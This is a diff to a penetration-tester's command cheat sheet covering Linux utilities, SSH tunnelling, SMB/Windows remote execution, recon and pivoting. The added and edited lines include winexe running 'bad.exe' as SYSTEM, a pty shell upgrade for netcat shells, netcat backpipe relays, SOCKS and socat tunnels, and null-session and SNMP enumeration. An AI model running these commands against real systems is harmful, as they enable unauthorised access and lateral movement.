@@ -61,7 +61,9 @@ chmod -50 tcsh/csh/ksh                                                          
 
 ********************  Linux Utility Commands  ************************
 wget http:// url -0 url.txt -o /dev/null                                                     #Grab url
-rdesktop -u <username> -p <Password> -d <domain> -f -r clipboard:PRIMARYCLIPBOARD ip         #Remote Desktop to ip
+wget https://8.8.8.8 --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0" -O - -o /dev/null --no-check-certificate
+
+rdesktop -u <username> -p <Password> -d <domain> -n Windows7 -f -g 1920x1080 clipboard:PRIMARYCLIPBOARD ip         #Remote Desktop to ip
 scp /tmp/file user@x.x.x.x:/tmp/file                                                         #Put file
 scp user@<remoteip>:/tmp/file /tmp/file                                                      #Get file
 useradd -m user                                                                              #Add user
@@ -75,7 +77,7 @@ tar -xvfj file.tar                                                              
 tar -czvf <file>.tar.gz /original-file                                                       #Archive a gzip(z) file
 encfs /cryptdir /tmp/cleartext                                                               #Temporarily unencrypts to /tmp/cleartext
 python -c 'import pty;pty.spawn("/bin/bash")'                                                #Upgrades a nc shell to tty
-
+openssl rand -base64 12                                                                      #generates a 12 charater random password   
 
 
 ********************  Linux File Commands  ************************
@@ -143,7 +145,7 @@ ssh root@1.1.1.1 -v -o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking 
 cat localfile.txt | ssh user@<ip> " cat > file"                                     #SSH file transfer
 ssh -N -M -S /tmp/sshtgt1 user@1.1.1.1                                              #Creates a Control Socket at /tmp/sshtgt1
 ssh -S /tmp/sshtgt1 -O forward user@1.1.1.1                                         #Creates an interractive session on target using existing sockets.
-/usr/sbin/sshd -D -P 2222 -q -O "AllowTCPForwarding yes" -O "GatewayPorts yes"      #Createsssh server listening on a radom port ready for ssh tunnels 
+/usr/sbin/sshd -D -p 2222 -q -o "AllowTCPForwarding yes" -o "GatewayPorts yes"      #Createsssh server listening on a radom port ready for ssh tunnels 
 
 
 ********************  Linux Scripting  ************************
@@ -311,7 +313,7 @@ mount.cifs // ip /share /mnt/share -o user= user ,pass= pass ,sec=ntlmssp,domain
 
 enum4linux <IP>                                                                 #A very detailed remote SMB enumeration 
 /usr/share/doc/python-impacket/examples/psexec.py domain/user:'password'@<ip>   #psexec but cleaner
-winexe -u domain.name/username //ip C:\\windows\\bad.exe --system               #Executes Bad.exe on remote windows box.  if no program is listed will default to cmd.exe
+winexe -U domain.name/username //ip C:\\windows\\bad.exe --system               #Executes Bad.exe on remote windows box.
 
 ********************  PFSense ***********************
 pfSsh.php                                                   #pfSense Shell System
@@ -1112,12 +1114,17 @@ onidle /i 30
 
 
 ********************  Recon  ***********************
+tcpdump -nnvX -s 0 host 8.8.8.8
+
 nc -nv 1.1.1.1 80           #banner a web page
-GET / http/1.0
+GET / HTTP/1.0
 
 rpcinfo -p <ip>             #unumerates linux boxes, needs apt-get install rpcbind nfs-common
 rpcclient -U "" <IP>        #enum windows boxes
 nmap --script smb-os-discovery.nse -p445 <IP>
+nc -nv 8.8.8.8 5985
+snmpwalk -c public -v1 8.8.8.8
+ls /usr/share/nmap/scripts/* | grep ftp
 
 
 ********************  TTL Fingerprints ***********************
@@ -1501,6 +1508,14 @@ On attacker (client)
 cd /tmp
 mknod backpipe q
 nc -v -l -p 4444 0<backpipe | nc <T1IP> 80 | tee backpipe
+
+###Dynamic SSH Socks Tunnel with proxychains
+ssh /tmp/Rd.s user -Nf -D 0.0.0.0:1090
+proxychains /bin/bash
+socat UDP-listen:22,reuseaddr,fork UDP:10.10.100.170:22 &
+socat tcp4-listen:22,reuseaddr,fork tcp-4:10.10.100.170:22 &
+
+
 
 ********************  NMAP  ***********************
 
